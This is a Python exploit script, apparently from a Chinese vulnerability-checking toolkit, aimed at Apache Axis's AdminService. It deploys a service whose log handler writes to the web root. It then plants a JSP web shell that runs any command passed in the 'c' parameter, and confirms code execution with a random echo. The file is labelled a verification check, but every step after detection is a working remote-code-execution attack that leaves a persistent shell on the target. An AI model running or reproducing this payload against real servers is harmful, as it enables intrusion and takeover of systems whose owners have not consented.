#!/usr/bin/env python3

'''
name: Axis漏洞
description: Axis漏洞可执行任意命令
'''

import string
import random
import requests

class Axis_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta='' 
        words=''.join((string.ascii_letters,string.digits))
        for i in range(8):
            self.capta = self.capta + random.choice(words) 
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Pragma': 'no-cache'
        }
        self.check_headers = {
            "Content-Type":"application/xml",
            "SOAPAction":"somethi"
        }
        self.shell_headers = {
            "Content-Type": "application/xml", 
            "SOAPAction": "somethi"
        }
        self.check_payload = '''
            <?xml version="1.0" encoding="utf-8"?>
            <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                    xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
                    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Body>
            <ns1:deployment
            xmlns="http://xml.apache.org/axis/wsdd/"
            xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
            xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="RandomService" provider="java:RPC">
                <requestFlow>
                <handler type="RandomLog"/>
                </requestFlow>
                <ns1:parameter name="className" value="java.util.Random"/>
                <ns1:parameter name="allowedMethods" value="*"/>
            </ns1:service>
            <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
                <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />   
                <parameter name="LogHandler.writeToConsole" value="false" /> 
            </handler>
            </ns1:deployment>
            </soapenv:Body>
            </soapenv:Envelope>
            '''

        self.shell_payload = '''
            <?xml version="1.0" encoding="utf-8"?>
                <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
                xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                <soapenv:Body>
                <api:main
                soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                    <api:in0><![CDATA[
                <%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
                ]]>
                </api:in0>
                </api:main>
                </soapenv:Body>
                </soapenv:Envelope>
            '''                         
    
    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = requests.get(self.url + "/services/AdminService", headers = self.check_headers, verify = False, data = self.check_payload)
            if check_req.status_code == 200 and "processing</Admin>" in check_req.text :
                print("存在Axis漏洞")
                shell__req = requests.post(self.url + "/services/RandomService", data = self.shell_payload, headers = self.shell_headers, verify = False)
                cmd_req = requests.get(self.url + "../shell.jsp?c=echo%20" + self.capta , headers = self.headers, verify = False)
                if cmd_req.status_code == 200 and self.capta in cmd_req.text:
                    print("上传的jsp文件路径为:", self.url + "../shell.jsp")
            else:
                print("不存在Axis漏洞！")
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    axis = Axis_BaseVerify('http://127.0.0.1:8000')
    axis.run()